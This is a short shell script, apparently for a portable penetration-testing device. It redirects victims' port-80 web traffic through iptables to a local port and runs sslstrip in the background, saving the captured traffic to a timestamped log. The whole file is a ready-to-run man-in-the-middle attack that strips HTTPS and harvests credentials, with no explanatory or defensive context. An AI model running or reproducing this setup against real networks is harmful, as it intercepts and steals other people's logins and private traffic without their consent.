#!/bin/sh

export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/sd/lib:/sd/usr/lib
export PATH=$PATH:/sd/usr/bin:/sd/usr/sbin

MYPATH="$(dirname $0)/"
MYTIME=`date +%s`

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
#iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 10000

sslstrip -k -f -w ${MYPATH}log/output_${MYTIME}.log 2>&1 &